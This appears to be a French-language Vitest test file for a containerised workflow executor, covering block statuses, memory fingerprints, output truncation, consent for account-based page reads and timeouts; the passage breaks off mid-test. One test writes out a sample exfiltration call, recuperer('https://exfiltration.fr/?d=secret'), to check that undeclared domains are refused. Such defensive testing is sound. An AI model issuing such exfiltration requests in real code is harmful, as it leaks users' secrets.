import { describe, it, expect, afterEach, vi } from "vitest";
import { spawn } from "node:child_process";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { PassThrough } from "node:stream";
import { readFileSync } from "node:fs";
import { pathToFileURL } from "node:url";
import { writeFile } from "node:fs/promises";
import { join } from "node:path";
import { PontFactice } from "../../src/mcp/pont-factice.js";
import {
  DELAI_EXECUTION_MS,
  ECART_MEMOIRE_MS,
  ECART_PUBLICATIONS_MS,
  MEMOIRE_NON_GARDEE,
  PROFIL_REFUSE,
  executerWorkflow,
  type ContexteWorkflow,
  type InfraWorkflow,
  type LanceurProcessus,
} from "../../src/workflows/executer.js";
import { SORTIE_MAX_OCTETS } from "../../src/workflows/executions.js";
import { PLAFOND_RECHERCHES, RECHERCHES_ARRETEES, TROP_DE_LECTURES } from "../../src/workflows/acces.js";
import { RECHERCHE_REFUSEE, RESULTATS_ILLISIBLES, extraireResultats, urlRecherche } from "../../src/workflows/duckduckgo.js";
import { Menagement } from "../../src/workflows/menagement.js";
import { WEB_REQUIS } from "../../src/workflows/valider.js";
import { LIGNE_MAX_OCTETS, TAILLE_MAX_DONNEES } from "../../src/workflows/protocole.js";
import { TAILLE_MAX_DONNEES as TAILLE_MAX_DONNEES_ACCUEIL } from "../../src/accueil/schemas.js";
import { REJEU_TROP_GROS } from "../../src/workflows/rejeu.js";
import { empreinteParametres, type MemoireBlocs } from "../../src/workflows/memoire.js";
import { validerWorkflow } from "../../src/workflows/valider.js";
import { dossierTemporaire } from "../aide/temporaire.js";
import { Atelier } from "../../src/conteneur/atelier.js";
import { cheminsEspace } from "../../src/chemins.js";
import { chaineAuFilDeLEau } from "../../src/workflows/chaine.js";

const MOTEUR = join(import.meta.dirname, "..", "..", "docker", "moteur");
const SCRIPT = join(MOTEUR, "recolteur.mjs");
const MAINTENANT = new Date("2026-10-29T10:00:00.000Z");

const aFermer: { fermer(): Promise<void> }[] = [];
afterEach(async () => {
  await Promise.all(aFermer.splice(0).map((s) => s.fermer()));
});

async function serveurWeb(routes: Record<string, (res: import("node:http").ServerResponse) => void>) {
  const requetes: string[] = [];
  const s: Server = createServer((req, res) => {
    requetes.push(req.url ?? "");
    const r = routes[req.url ?? ""];
    if (r) r(res);
    else {
      res.writeHead(404);
      res.end();
    }
  });
  await new Promise<void>((ok) => s.listen(0, "127.0.0.1", ok));
  const port = (s.address() as AddressInfo).port;
  const serveur = {
    port,
    url: `http://127.0.0.1:${port}`,
    requetes,
    fermer: () => new Promise<void>((ok) => { s.closeAllConnections(); s.close(() => ok()); }),
  };
  aFermer.push(serveur);
  return serveur;
}

const valide = (brut: unknown) => {
  const r = validerWorkflow(brut);
  if (!r.ok) throw new Error(r.erreur);
  return r.valide;
};

/** code (fichier `<id>.mjs`) → … → sortie, en chaîne. */
const chaine = (...ids: string[]) => ({
  version: 1,
  blocs: [...ids.map((id) => ({ id, type: "code", parametres: { source: `${id}.mjs` } })), { id: "sortie", type: "sortie", parametres: { vers: "widget" } }],
  liens: [...ids, "sortie"].slice(1).map((vers, i) => ({ de: [...ids, "sortie"][i]!, vers })),
});

interface Banc {
  ctx: ContexteWorkflow;
  infra: InfraWorkflow;
  commandes: string[][];
  supprimes: string[];
  tues: number;
  refusEnCours: number;
}

/** Un widget (fichiers dans un dossier temporaire) et un lanceur qui exécute le récolteur en local, sans docker. */
async function banc(
  workflow: unknown,
  fichiers: Record<string, string> = {},
  o: { compte?: string[]; publiques?: string[]; accord?: { profil: string } | null; pont?: PontFactice; memoire?: MemoireBlocs; delaiMs?: number; lancer?: LanceurProcessus } = {},
): Promise<Banc> {
  const dossier = await dossierTemporaire();
  for (const [nom, contenu] of Object.entries(fichiers)) await writeFile(join(dossier, nom), contenu);
  const b: Banc = {
    commandes: [],
    supprimes: [],
    tues: 0,
    refusEnCours: 0,
    ctx: {
      proprietaire: { type: "widget", id: "essai" },
      valide: valide(workflow),
      dossierFichiers: dossier,
      config: { interets: "rust" },
      precedent: null,
      memoire: o.memoire ?? {},
      sources: { compte: o.compte ?? [], publiques: o.publiques ?? [] },
      accord: async () => (o.accord === undefined ? null : o.accord),
      surProfilRefuse: async () => {
        b.refusEnCours++;
      },
      messageAccordRequis: "Accord requis pour lire avec ton compte : app.daily.dev",
      declencheur: "manuelle",
    },
    infra: {
      moteur: MOTEUR,
      atelier: {
        commandeRecolte: (id, d, m) => ["docker", "run", id, d, m],
        supprimerRecolte: async (id) => {
          b.supprimes.push(id);
        },
      },
      lancer:
        o.lancer ??
        ((cmd, args) => {
          b.commandes.push([cmd, ...args]);
          const e = spawn(process.execPath, [SCRIPT, dossier], { stdio: ["pipe", "pipe", "pipe"] });
          return {
            stdin: e.stdin,
            stdout: e.stdout,
            stderr: e.stderr,
            tuer: () => {
              b.tues++;
              e.kill("SIGKILL");
            },
            fin: new Promise((ok) => e.on("close", (c) => ok(c))),
          };
        }),
      ia: null,
      pont: o.pont ?? new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } }),
      horloge: () => MAINTENANT,
      delaiMs: o.delaiMs,
      adressesLocales: true,
    },
  };
  return b;
}

/** Un faux processus qui écrit ces lignes sur stdout puis sort avec `code`. */
const lanceurScripte = (lignes: unknown[], code = 0): LanceurProcessus => () => {
  const stdout = new PassThrough();
  const stderr = new PassThrough();
  const stdin = new PassThrough();
  stdin.resume();
  const fin = new Promise<number | null>((ok) => {
    setImmediate(() => {
      for (const l of lignes) stdout.write((typeof l === "string" ? l : JSON.stringify(l)) + "\n");
      stdout.end();
      stderr.end();
      setImmediate(() => ok(code));
    });
  });
  return { stdin, stdout, stderr, tuer: () => {}, fin };
};

describe("executerWorkflow", () => {
  it("un workflow code → sortie rend fin avec la valeur et une exécution réussie bloc par bloc", async () => {
    const b = await banc(chaine("a"), {
      "a.mjs": `export default async (entree, w) => { w.journal("bonjour", 2); return [{ x: 1 }, { x: 2 }, w.config]; };`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "fin", sortie: { vers: "widget", valeur: [{ x: 1 }, { x: 2 }, { interets: "rust" }] }, memoire: {} });
    expect(r.execution).toMatchObject({
      version: 1,
      id: "2026-10-29T10-00-00-000Z",
      proprietaire: { type: "widget", id: "essai" },
      declencheur: "manuelle",
      debut: MAINTENANT.toISOString(),
      fin: MAINTENANT.toISOString(),
      statut: "reussie",
    });
    expect(r.execution.erreur).toBeUndefined();
    expect(r.execution.blocs).toEqual([
      { id: "a", type: "code", statut: "reussi", debut: MAINTENANT.toISOString(), fin: MAINTENANT.toISOString(), elements: 3, sortie: [{ x: 1 }, { x: 2 }, { interets: "rust" }], journal: ["bonjour 2"] },
      { id: "sortie", type: "sortie", statut: "reussi", debut: MAINTENANT.toISOString(), fin: MAINTENANT.toISOString(), elements: 3, sortie: [{ x: 1 }, { x: 2 }, { interets: "rust" }], journal: [] },
    ]);
    // Le journal global garde ce que le code écrit (stderr), comme avant les workflows.
    expect(r.journal).toContain("bonjour 2");
    expect(b.commandes[0]).toEqual(["docker", "run", "essai", b.ctx.dossierFichiers, MOTEUR]);
    expect(b.supprimes).toEqual([]);
  });

  it("un bloc partiel donne une exécution partielle", async () => {
    const web = await serveurWeb({ "/a": (res) => res.end("contenu a") });
    const b = await banc(
      {
        version: 1,
        blocs: [
          { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
          { id: "lire", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
          { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
        ],
        liens: [{ de: "liste", vers: "lire" }, { de: "lire", vers: "sortie" }],
      },
      { "liste.mjs": `export default async () => [{ url: "${web.url}/a" }, { url: "${web.url}/absente" }];` },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue.t).toBe("fin");
    expect(r.execution.statut).toBe("partielle");
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "partiel", "reussi"]);
    expect(r.execution.blocs[1]!.sortie).toEqual([{ url: `${web.url}/a`, contenu: "contenu a" }, { url: `${web.url}/absente` }]);
    expect(r.execution.blocs[1]!.journal.join("\n")).toMatch(/404/);
  });

  it("un bloc échoué : issue echec, exécution échouée, blocs suivants pas-lancé", async () => {
    const b = await banc(chaine("a", "b"), {
      "a.mjs": `export default async () => { throw new Error("cassé : x"); };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "echec", erreur: "cassé : x", erreurDuCode: true });
    expect(r.execution.statut).toBe("echouee");
    expect(r.execution.erreur).toBe("cassé : x");
    expect(r.execution.erreurNoyau).toBeUndefined();
    expect(r.execution.blocs).toEqual([
      { id: "a", type: "code", statut: "echoue", debut: MAINTENANT.toISOString(), fin: MAINTENANT.toISOString(), elements: null, erreur: "cassé : x", journal: [] },
      { id: "b", type: "code", statut: "pas-lance", debut: null, fin: null, elements: null, journal: [] },
      { id: "sortie", type: "sortie", statut: "pas-lance", debut: null, fin: null, elements: null, journal: [] },
    ]);
  });

  it("la mémoire envoyée par le conteneur revient dans l'issue fin", async () => {
    const workflow = {
      version: 1,
      blocs: [
        { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
        { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "url" } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "liste", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
    };
    const fichiers = { "liste.mjs": `export default async () => [{ url: "a" }, { url: "b" }];` };
    const premier = await banc(workflow, fichiers);
    const r1 = await executerWorkflow(premier.ctx, premier.infra);
    expect(r1.issue.t === "fin" && r1.issue.sortie.valeur).toEqual([{ url: "a" }, { url: "b" }]);
    const memoire = r1.issue.t === "fin" ? r1.issue.memoire : null;
    expect(memoire?.nouveaux?.type).toBe("liste.nouveaux");

    // La mémoire est renvoyée au conteneur : rien de nouveau la fois suivante. Une entrée d'un autre bloc ne passe pas.
    const second = await banc(workflow, fichiers, { memoire: { ...memoire!, ailleurs: { type: "liste.nouveaux", valeur: [] } } });
    const r2 = await executerWorkflow(second.ctx, second.infra);
    expect(r2.issue.t === "fin" && r2.issue.sortie.valeur).toEqual([]);
    expect(r2.issue.t === "fin" && Object.keys(r2.issue.memoire ?? {})).toEqual(["nouveaux"]);
  });

  it("une trace pour un bloc inconnu ou mal formée est ignorée", async () => {
    const b = await banc(chaine("a"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "bloc", id: "inconnu", etape: "debut" });
        l({ t: "bloc", id: "inconnu", etape: "fin", statut: "reussi", sortie: 1 });
        l({ t: "journal", bloc: "inconnu", texte: "x" });
        l({ t: "bloc", id: "sortie", etape: "fin", statut: "bizarre" });
        l({ t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: "forgée" });
        process.stdout.write("pas du json\\n");
        return 1;
      };`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: 1 } });
    expect(r.execution.blocs.map((x) => x.id)).toEqual(["a", "sortie"]);
    expect(r.execution.blocs[1]).toMatchObject({ statut: "reussi", sortie: 1 });
  });

  it("une trace forgée pour un bloc qui n'est pas le suivant ne compte pas", async () => {
    const b = await banc(chaine("a", "b"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "bloc", id: "b", etape: "debut" });
        l({ t: "bloc", id: "b", etape: "fin", statut: "reussi", sortie: "forgée" });
        throw new Error("cassé");
      };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "echec", erreur: "cassé" });
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["echoue", "pas-lance", "pas-lance"]);
    expect(r.execution.blocs[1]!.sortie).toBeUndefined();
  });

  it("mémoire forgée : seulement les blocs du workflow avec leur type, la dernière ligne avant fin compte", async () => {
    const workflow = {
      version: 1,
      blocs: [
        { id: "amont", type: "code", parametres: { source: "amont.mjs" } },
        { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "url" } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "amont", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
    };
    const b = await banc(workflow, {}, {
      lancer: lanceurScripte([
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["premiere"] } } },
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["x"] }, autre: { type: "liste.nouveaux", valeur: 1 }, sortie: { type: "code", valeur: 2 } } },
        { t: "memoire", memoire: "pas un objet" },
        { t: "fin", donnees: [] },
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["après fin"] } } },
      ]),
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "fin", sortie: { vers: "widget", valeur: [] }, memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["x"], empreinte: empreinteParametres({ cle: "url" }) } } });
    // Aucune trace de bloc reçue : un bloc jamais commencé reste pas-lancé.
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["pas-lance", "pas-lance", "pas-lance"]);
  });

  it("une mémoire de plus de 3 Mo est écartée avec une remarque au journal", async () => {
    const b = await banc({ version: 1, blocs: [{ id: "amont", type: "code", parametres: { source: "amont.mjs" } }, { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "url" } }, { id: "sortie", type: "sortie" , parametres: { vers: "widget" } }], liens: [{ de: "amont", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }] }, {}, {
      lancer: lanceurScripte([
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: "x".repeat(3.5 * 1024 * 1024) } } },
        { t: "fin", donnees: 1 },
      ]),
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", memoire: null });
    expect(r.journal).toContain(MEMOIRE_NON_GARDEE);
    // Aussi dans l'exécution, au journal du bloc de sortie.
    expect(r.execution.blocs.find((x) => x.id === "sortie")!.journal).toEqual([MEMOIRE_NON_GARDEE]);
  });

  it("une trace de bloc commencé sans fin le donne échoué ; journal de bloc borné à 200 lignes de 500 caractères", async () => {
    const b = await banc(chaine("a"), {}, {
      lancer: lanceurScripte([
        { t: "bloc", id: "a", etape: "debut" },
        ...Array.from({ length: 250 }, (_, i) => ({ t: "journal", bloc: "a", texte: `${i} ${"y".repeat(800)}` })),
        { t: "echec", erreur: "arrêt" },
      ], 1),
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "echec", erreur: "arrêt", erreurDuCode: true });
    const a = r.execution.blocs[0]!;
    expect(a.statut).toBe("echoue");
    expect(a.journal).toHaveLength(200);
    expect(a.journal[0]).toMatch(/51 lignes coupées/);
    expect(a.journal[199]!.startsWith("249 ")).toBe(true);
    expect(a.journal.every((l) => l.length <= 500)).toBe(true);
    expect(r.execution.blocs[1]!.statut).toBe("pas-lance");
  });

  it("une sortie de 5 Mo (page énorme) arrive tronquée et marquée, sans arrêter l'exécution", async () => {
    const b = await banc(chaine("enorme", "moyenne", "court"), {
      "enorme.mjs": `export default async () => "x".repeat(5 * 1024 * 1024);`,
      "moyenne.mjs": `export default async (e) => e.slice(0, 1024 * 1024);`,
      "court.mjs": `export default async (e) => ({ longueur: e.length });`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: { longueur: 1024 * 1024 } } });
    expect(r.execution.statut).toBe("reussie");
    const [enorme, moyenne, court] = r.execution.blocs;
    expect(enorme).toMatchObject({ statut: "reussi", sortieTronquee: true });
    expect(enorme!.sortie).toBeUndefined();
    expect(moyenne).toMatchObject({ statut: "reussi", sortieTronquee: true });
    expect(typeof moyenne!.sortie).toBe("string");
    expect(Buffer.byteLength(moyenne!.sortie as string)).toBeLessThanOrEqual(SORTIE_MAX_OCTETS);
    expect((moyenne!.sortie as string).startsWith('"xxx')).toBe(true);
    expect(court).toMatchObject({ statut: "reussi", sortie: { longueur: 1024 * 1024 } });
    expect(court!.sortieTronquee).toBeUndefined();
  });

  it("lirePage avec compte sans accord : arrêt accord-requis", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } });
    const b = await banc(chaine("a"), { "a.mjs": `export default async (e, w) => w.lirePage("https://app.daily.dev/", { compte: true });` }, { compte: ["app.daily.dev"], accord: null, pont });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(r.execution).toMatchObject({ statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev", erreurNoyau: true });
    expect(r.execution.blocs[0]!.statut).toBe("echoue");
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(0);
    expect(b.supprimes).toEqual(["essai"]);
  });

  it("ProfilRefuse : surProfilRefuse appelé, arrêt PROFIL_REFUSE", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [], refuser: ["perso"] } });
    const b = await banc(chaine("a"), { "a.mjs": `export default async (e, w) => w.lirePage("https://app.daily.dev/", { compte: true });` }, { compte: ["app.daily.dev"], accord: { profil: "perso" }, pont });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(b.refusEnCours).toBe(1);
    expect(r.issue).toEqual({ t: "arret", statut: "accord-requis", erreur: PROFIL_REFUSE });
    expect(r.execution.statut).toBe("accord-requis");
  });

  it("une fin écrite tôt par le code : exécution partielle, blocs suivants pas-lancé", async () => {
    const b = await banc(chaine("a", "b"), {
      "a.mjs": `export default async () => {
        process.stdout.write(JSON.stringify({ t: "fin", donnees: "tôt" }) + "\\n");
        await new Promise((ok) => setTimeout(ok, 50));
        process.exit(0);
      };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "tôt" } });
    expect(r.execution.statut).toBe("partielle");
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["echoue", "pas-lance", "pas-lance"]);
  });

  it("accord retiré entre deux lectures avec compte : arrêt accord-requis, pas de seconde lecture", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [{ url: "https://app.daily.dev/", titre: "Fil", texte: "articles", liens: [] }] } });
    const b = await banc(
      chaine("a"),
      { "a.mjs": `export default async (e, w) => { await w.lirePage("https://app.daily.dev/", { compte: true }); return w.lirePage("https://app.daily.dev/", { compte: true }); };` },
      { compte: ["app.daily.dev"], pont },
    );
    let lectures = 0;
    b.ctx.accord = async () => (lectures++ === 0 ? { profil: "perso" } : null);
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(r.execution.statut).toBe("accord-requis");
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(1);
    expect(b.supprimes).toEqual(["essai"]);
  });

  it("lirePage avec compte et accord : le pont reçoit le profil et les domaines déclarés", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [{ url: "https://app.daily.dev/", titre: "Fil", texte: "articles", liens: [] }] } });
    const b = await banc(chaine("a"), { "a.mjs": `export default async (e, w) => (await w.lirePage("https://app.daily.dev/", { compte: true })).texte;` }, { compte: ["app.daily.dev"], accord: { profil: "perso" }, pont });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "articles" } });
    expect(pont.appels.find((a) => a.methode === "lirePageInvisible")!.args).toEqual(["https://app.daily.dev/", { profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true }]);
  });

  it("recuperer vers un domaine non déclaré pour un propriétaire avec compte : refusé", async () => {
    const web = await serveurWeb({ "/": (res) => res.end("ok") });
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } });
    const b = await banc(
      chaine("a"),
      {
        "a.mjs": `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
        export default async (e, w) => [
          await essai(w.recuperer("https://exfiltration.fr/?d=secret")),
          await essai(w.recuperer("http://localhost:${web.port}/")),
          await essai(w.lirePage("https://exfiltration.fr/")),
          await essai(w.recuperer("${web.url}/")),
        ];`,
      },
      { compte: ["app.daily.dev"], publiques: ["127.0.0.1"], accord: { profil: "perso" }, pont },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    const [externe, autreNom, page, declare] = (r.issue.t === "fin" ? r.issue.sortie.valeur : []) as string[];
    expect(externe).toMatch(/^refus: .*non déclaré/);
    expect(autreNom).toMatch(/^refus: .*non déclaré/);
    expect(page).toMatch(/^refus: .*non déclaré/);
    expect(declare).toBe("ok");
    expect(web.requetes).toHaveLength(1);
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(0);
  });

  it("délai dépassé : arrêt « Délai dépassé » et conteneur supprimé", async () => {
    const b = await banc(chaine("a"), { "a.mjs": `export default () => new Promise(() => {});` }, { delaiMs: 600 });
    const debut = Date.now();
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(Date.now() - debut).toBeLessThan(5000);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    expect(r.execution).toMatchObject({ statut: "echouee", erreur: "Délai dépassé", erreurNoyau: true });
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["echoue", "pas-lance"]);
    expect(b.tues).toBeGreaterThan(0);
    expect(b.supprimes).toEqual(["essai"]);
    expect(DELAI_EXECUTION_MS).toBe(200_000);
  });

  it("le debut porte le workflow validé et la config ; la mémoire suit", async () => {
    const recu: string[] = [];
    const b = await banc(chaine("a"), {}, {
      lancer: () => {
        const p = lanceurScripte([{ t: "fin", donnees: null }])("", []);
        p.stdin.on("data", (d: Buffer) => recu.push(d.toString()));
        return p;
      },
      memoire: { a: { type: "code", valeur: 1 } },
    });
    b.ctx.precedent = { ancien: true };
    await executerWorkflow(b.ctx, b.infra);
    const lignes = recu.join("").trim().split("\n").map((l) => JSON.parse(l));
    expect(lignes[0]).toEqual({
      t: "debut",
      precedent: { ancien: true },
      maintenant: MAINTENANT.toISOString(),
      config: { interets: "rust" },
      workflow: { blocs: b.ctx.valide.workflow.blocs, liens: b.ctx.valide.workflow.liens, ordre: ["a", "sortie"] },
    });
    expect(lignes[1]).toEqual({ t: "memoire", memoire: { a: { type: "code", valeur: 1 } } });
  });

  /** Les lignes que le conteneur reçoit (début, mémoire) et la mémoire rendue, pour un workflow `a` → `sortie`. */
  async function memoireVueParLeConteneur(workflow: unknown, memoire: MemoireBlocs, rendue: MemoireBlocs = {}) {
    const recu: string[] = [];
    const b = await banc(workflow, {}, {
      lancer: () => {
        const p = lanceurScripte([{ t: "memoire", memoire: rendue }, { t: "fin", donnees: null }])("", []);
        p.stdin.on("data", (d: Buffer) => recu.push(d.toString()));
        return p;
      },
      memoire,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    const lignes = recu.join("").trim().split("\n").map((l) => JSON.parse(l));
    return { envoyee: lignes[1].memoire as MemoireBlocs, rendue: r.issue.t === "fin" ? r.issue.memoire : null, ctx: b.ctx };
  }

  it("une mémoire dont l'empreinte ne correspond plus aux paramètres n'est pas envoyée au conteneur", async () => {
    const wf = (cle: string) => ({
      version: 1,
      blocs: [
        { id: "a", type: "code", parametres: { source: "a.mjs" } },
        { id: "n", type: "liste.nouveaux", parametres: { cle } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "a", vers: "n" }, { de: "n", vers: "sortie" }],
    });
    const memoire: MemoireBlocs = {
      n: { type: "liste.nouveaux", valeur: ["x"], empreinte: empreinteParametres({ cle: "url" }) },
      a: { type: "code", valeur: 1 }, // ancienne mémoire sans empreinte : acceptée une fois
    };
    const memes = await memoireVueParLeConteneur(wf("url"), memoire);
    expect(memes.envoyee).toEqual({ n: { type: "liste.nouveaux", valeur: ["x"] }, a: { type: "code", valeur: 1 } }); // sans l'empreinte
    const autres = await memoireVueParLeConteneur(wf("titre"), memoire);
    expect(autres.envoyee).toEqual({ a: { type: "code", valeur: 1 } });
  });

  it("la mémoire rendue est marquée de l'empreinte des paramètres de l'exécution, même si workflow.json a changé pendant", async () => {
    // L'exécution ne lit jamais workflow.json : elle reçoit ctx.valide, validé au départ. Un fichier réécrit pendant
    // l'exécution ne change donc rien à ce qui est marqué ; les nouveaux réglages ne retrouvent pas cette mémoire.
    const wf = (cle: string) => ({
      version: 1,
      blocs: [
        { id: "a", type: "code", parametres: { source: "a.mjs" } },
        { id: "n", type: "liste.nouveaux", parametres: { cle } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "a", vers: "n" }, { de: "n", vers: "sortie" }],
    });
    const premiere = await memoireVueParLeConteneur(wf("url"), {}, { n: { type: "liste.nouveaux", valeur: ["vu"] } });
    expect(premiere.rendue).toEqual({ n: { type: "liste.nouveaux", valeur: ["vu"], empreinte: empreinteParametres({ cle: "url" }) } });
    // workflow.json a changé (cle: titre) : la seconde exécution reçoit une mémoire vide pour ce bloc.
    const seconde = await memoireVueParLeConteneur(wf("titre"), premiere.rendue!);
    expect(seconde.envoyee).toEqual({});
  });

  describe("essais (rejeu depuis un bloc)", () => {
    const T = MAINTENANT.toISOString();
    /** a → b → c → sortie : rejeu depuis c, b repris (2 éléments), a ni relancé ni repris. */
    const rejeuDepuisC = { relances: ["c", "sortie"], sorties: { b: [{ x: 1 }, { x: 2 }] }, repris: { b: 2 } };

    it("un essai rend une exécution avec repris, pas-lance et les blocs relancés", async () => {
      const b = await banc(chaine("a", "b", "c"), {
        "a.mjs": `export default async () => { throw new Error("a lancé"); };`,
        "b.mjs": `export default async () => { throw new Error("b lancé"); };`,
        "c.mjs": `export default async (entree) => entree.map((e) => e.x * 10);`,
      });
      b.ctx.declencheur = "rejeu";
      b.ctx.rejeu = rejeuDepuisC;
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(r.issue).toEqual({ t: "fin", sortie: { vers: "widget", valeur: [10, 20] }, memoire: null });
      expect(r.execution.statut).toBe("reussie");
      expect(r.execution.declencheur).toBe("rejeu");
      expect(r.execution.blocs).toEqual([
        { id: "a", type: "code", statut: "pas-lance", debut: null, fin: null, elements: null, journal: [] },
        { id: "b", type: "code", statut: "repris", debut: null, fin: null, elements: 2, journal: [] },
        { id: "c", type: "code", statut: "reussi", debut: T, fin: T, elements: 2, sortie: [10, 20], journal: [] },
        { id: "sortie", type: "sortie", statut: "reussi", debut: T, fin: T, elements: 2, sortie: [10, 20], journal: [] },
      ]);
    });

    it("un essai : le statut ne compte que les blocs relancés, et les lignes forgées pour un bloc repris ou non relancé sont rejetées", async () => {
      const b = await banc(chaine("a", "b", "c"), {}, {
        lancer: lanceurScripte([
          { t: "bloc", id: "b", etape: "debut" },
          { t: "journal", bloc: "b", texte: "forgé" },
          { t: "bloc", id: "b", etape: "fin", statut: "reussi", sortie: "forgée" },
          { t: "journal", bloc: "a", texte: "forgé" },
          { t: "bloc", id: "c", etape: "debut" },
          { t: "bloc", id: "c", etape: "fin", statut: "reussi", sortie: [1] },
          { t: "bloc", id: "a", etape: "debut" },
          { t: "bloc", id: "sortie", etape: "debut" },
          { t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: [1] },
          { t: "fin", donnees: [1] },
        ]),
      });
      b.ctx.rejeu = rejeuDepuisC;
      const relayees: unknown[] = [];
      b.infra.surTrace = (t) => relayees.push(t);
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(r.execution.statut).toBe("reussie");
      expect(r.execution.blocs.map((x) => [x.id, x.statut])).toEqual([["a", "pas-lance"], ["b", "repris"], ["c", "reussi"], ["sortie", "reussi"]]);
      expect(r.execution.blocs[0]!.journal).toEqual([]);
      expect(r.execution.blocs[1]).toMatchObject({ elements: 2, journal: [], debut: null });
      expect(r.execution.blocs[1]!.sortie).toBeUndefined();
      expect(relayees.map((t: any) => `${t.etape}:${t.bloc}`)).toEqual(["debut:c", "fin:c", "debut:sortie", "fin:sortie"]);
    });

    it("un essai n'envoie aucune mémoire et n'en rend aucune", async () => {
      const recu: string[] = [];
      const b = await banc(chaine("a", "b", "c"), {}, {
        lancer: () => {
          const p = lanceurScripte([{ t: "memoire", memoire: { c: { type: "code", valeur: "forgée" } } }, { t: "fin", donnees: null }])("", []);
          p.stdin.on("data", (d: Buffer) => recu.push(d.toString()));
          return p;
        },
        memoire: { a: { type: "code", valeur: 1 }, c: { type: "code", valeur: 2 } },
      });
      b.ctx.rejeu = rejeuDepuisC;
      const r = await executerWorkflow(b.ctx, b.infra);
      const lignes = recu.join("").trim().split("\n").map((l) => JSON.parse(l));
      expect(lignes[0].rejeu).toEqual({ relances: ["c", "sortie"], sorties: { b: [{ x: 1 }, { x: 2 }] } });
      expect(lignes[1]).toEqual({ t: "memoire", memoire: {} });
      expect(r.issue).toMatchObject({ t: "fin", memoire: null });
    });

    it("des sorties à reprendre de plus de 4 Mo arrêtent l'essai sans lancer de conteneur", async () => {
      const b = await banc(chaine("a", "b", "c"));
      b.ctx.rejeu = { ...rejeuDepuisC, sorties: { b: "x".repeat(LIGNE_MAX_OCTETS) } };
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: REJEU_TROP_GROS });
